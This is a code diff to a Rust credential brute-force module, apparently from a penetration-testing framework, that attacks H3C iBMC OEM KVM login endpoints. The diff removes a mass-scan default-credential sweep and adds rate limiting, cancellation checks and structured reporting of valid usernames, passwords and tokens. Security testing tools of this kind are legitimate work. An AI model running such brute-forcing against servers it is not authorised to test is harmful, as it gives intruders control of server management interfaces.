@@ -28,16 +28,20 @@
 //!
 //! FOR AUTHORIZED TESTING ONLY.
 
-use anyhow::{anyhow, Context, Result};
+use anyhow::{ anyhow, Context, Result };
 use base64::Engine;
 use colored::*;
 use std::time::Duration;
 
-use crate::module_info::{ModuleInfo, ModuleRank};
-use crate::utils::network::{build_http_client_with, HttpClientOpts};
+use crate::module::{ Finding, FindingKind, ModuleCtx, ModuleOutcome };
+use crate::module_info::{ ModuleInfo, ModuleRank };
+use crate::utils::network::{ build_http_client_with, HttpClientOpts };
 use crate::utils::{
-    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_yes_no,
-    is_mass_scan_target, run_mass_scan, MassScanConfig, normalize_target,
+    cfg_prompt_default,
+    cfg_prompt_existing_file,
+    cfg_prompt_int_range,
+    cfg_prompt_yes_no,
+    normalize_target,
 };
 
 const DEFAULT_PORT: u16 = 443;
@@ -125,34 +129,15 @@ pub fn info() -> ModuleInfo {
     }
 }
 
-pub async fn run(target: &str) -> Result<()> {
-    if is_mass_scan_target(target) {
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "H3C iBMC OEM KVM",
-            default_port: DEFAULT_PORT,
-            state_file: "h3c_oem_kvm_mass_state.log",
-            default_output: "h3c_oem_kvm_mass_results.txt",
-            default_concurrency: 50,
-        }, |ip, port| async move {
-            let host = format!("{}:{}", ip, port);
-            let client = match build_http_client_with(
-                Duration::from_secs(5),
-                HttpClientOpts::permissive_unconditional(),
-            ) {
-                Ok(c) => c,
-                Err(_) => return None,
-            };
-            for (u, p) in DEFAULT_CREDS {
-                if let Some(token) = try_login(&client, &host, DEFAULT_PATH, u, p, Encoding::Plain).await {
-                    return Some(format!("{} {}:{} token={}\n", host, u, p, token));
-                }
-            }
-            None
-        }).await;
-    }
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("h3c_oem_kvm_bruteforce requires a single-host target")?;
 
     display_banner();
 
+    let mut outcome = ModuleOutcome::ok();
     let normalized = normalize_target(target)?;
     let host_input = if normalized.is_empty() {
         return Err(anyhow!("target is required"));
@@ -236,7 +221,9 @@ pub async fn run(target: &str) -> Result<()> {
     let mut tried = 0u64;
     'outer: for (user, pass) in &pairs {
         for enc in &encodings {
+            if ctx.is_cancelled() { break 'outer; }
             tried += 1;
+            ctx.rate_limit(target).await;
             if let Some(token) = try_login(&client, &host, &path, user, pass, *enc).await {
                 crate::mprintln!("{}", format!(
                     "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
@@ -247,6 +234,19 @@ pub async fn run(target: &str) -> Result<()> {
                     crate::cred_store::CredType::Password,
                     "creds/generic/h3c_oem_kvm_bruteforce",
                 ).await;
+                outcome.findings.push(Finding {
+                    target: target.to_string(),
+                    kind: FindingKind::Credential,
+                    message: format!("H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}", user, pass, enc.label(), host),
+                    data: Some(serde_json::json!({
+                        "service": "https",
+                        "port": port,
+                        "username": user,
+                        "password": pass,
+                        "encoding": enc.label(),
+                        "token": token,
+                    })),
+                });
                 found.push((user.clone(), pass.clone(), *enc, token));
                 if stop_on_hit { break 'outer; }
             } else if verbose {
@@ -267,7 +267,7 @@ pub async fn run(target: &str) -> Result<()> {
         crate::mprintln!("{}", "[-] No valid credentials found.".yellow());
     }
 
-    Ok(())
+    Ok(outcome)
 }
 
 /// Single login attempt. Returns `Some(token)` on success, `None` on any
@@ -354,3 +354,5 @@ fn strip_scheme(host: &str) -> String {
     if let Some(colon) = t.find(':') { t.truncate(colon); }
     t
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "generic/h3c_oem_kvm_bruteforce", native);
